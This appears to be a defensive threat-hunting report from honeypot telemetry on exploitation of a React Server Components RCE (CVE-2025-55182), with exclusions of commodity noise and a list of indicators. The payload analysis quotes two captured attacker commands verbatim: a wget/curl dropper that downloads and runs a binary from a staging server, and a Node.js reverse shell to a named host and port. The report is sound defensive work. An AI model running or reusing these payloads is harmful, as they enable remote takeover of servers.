# Zero-Day Hunting Report - Honeypot Telemetry
## Investigation Scope
- **Investigation Start (UTC)**: 2026-02-24T15:00:00.000Z
- **Investigation End (UTC)**: 2026-02-24T15:30:00.000Z
- **Total Attack Events**: 2,588

## Candidate Discovery Summary
| Candidate ID | Target Service | Indicators | Novelty Score | Classification |
|---|---|---|---|---|
| RSC-2026-001 | React / Next.js (Port 3000/3002) | Multi-endpoint POST (api/action, _rsc), Base64 encoded payload, Wget/Curl dropper, Reverse Shell | 8/10 | Novel Exploit Candidate (CVE-2025-55182) |

## Known-Exploit Exclusions
- **DoublePulsar SMB Probes**: 1,640 events detected primarily from `200.105.151.2` (Bolivia). Classic commodity noise.
- **SSH Brute Force**: High volume from `134.199.173.225` (Australia) and `159.65.85.38` (UK) targeting Port 22. Classed as commodity noise.
- **TLS DoS (CVE-2021-3449)**: Low volume (2 events), likely scanning artifact.

## Novel Exploit Candidates

### [RSC-2026-001] React Server Components RCE (CVE-2025-55182)
- **Target Ports**: 3000, 3002
- **Source IPs**: 
  - `176.65.139.44` (Germany, Pfcloud UG) - *Window 15:00-15:30*
  - `87.120.191.67` (United States, Vpsvault.host Ltd) - *Window 14:30-15:00*
- **Description**: Attackers are targeting React Server Components (RSC) using a flight protocol property access vulnerability.
- **Payload Analysis**:
  - **Payload A (IP 176.65.139.44)**: Base64 encoded downloader.
    - `wget http://130.12.180.69/x86_64 || curl http://130.12.180.69/x86_64 -o x86_64; chmod 777 x86_64; ./x86_64 React`
    - Staging Server: `130.12.180.69`
  - **Payload B (IP 87.120.191.67)**: Reverse Shell.
    - `var n=process.mainModule.require('net'),c=process.mainModule.require('child_process'),s=c.spawn('/bin/sh',[]),cl=new n.Socket();cl.connect(9323,'87.120.191.67',()=>{cl.pipe(s.stdin);s.stdout.pipe(cl);s.stderr.pipe(cl);});`
- **Novelty Assessment**:
  - **+2** Command execution (Reverse shell + Wget dropper).
  - **+2** Payload download-execute chain.
  - **+1** Cross-window recurrence with payload variation.
  - **+1** Behavioral variation (malware dropper vs reverse shell).
  - **+1** Multiple source IPs replaying logic.
  - **+1** Targeting modern frameworks (React/Next.js).
- **Novelty Score**: 8/10

## Infrastructure & Behavioral Classification
- **Novel Exploit Candidate**: RSC-2026-001. High-confidence exploitation of recently emerged CVE-2025-55182. Activity shows a mature campaign with multiple staging points and different exploit payloads for the same vulnerability.
- **Commodity Exploit Replay**: SMB DoublePulsar noise.
- **Automated Probing**: Postgres (Port 5432) malformed requests and non-standard port SSH probing (Port 8086).

## Analytical Assessment
The investigation identified active, high-priority exploitation attempts targeting React Server Components. The vulnerability (CVE-2025-55182) allows remote code execution via unsafe property access in the flight protocol. The observed telemetry shows attackers employing both reverse shells and malware droppers. The variation in staging infrastructure and payload logic suggests a coordinated or widely distributed exploitation campaign targeting modern web applications.

## Indicators of Interest (IOCs)
- **Attacking IPs**:
  - `176.65.139.44`
  - `87.120.191.67`
- **Staging Infrastructure**:
  - `130.12.180.69` (Malware staging)
  - `87.120.191.67:9323` (Reverse Shell C2)
- **Malware Artifact**: `x86_64`
- **Target Paths**:
  - `/api/action`
  - `/_rsc`
  - `/formaction`
  - `/api/formaction`
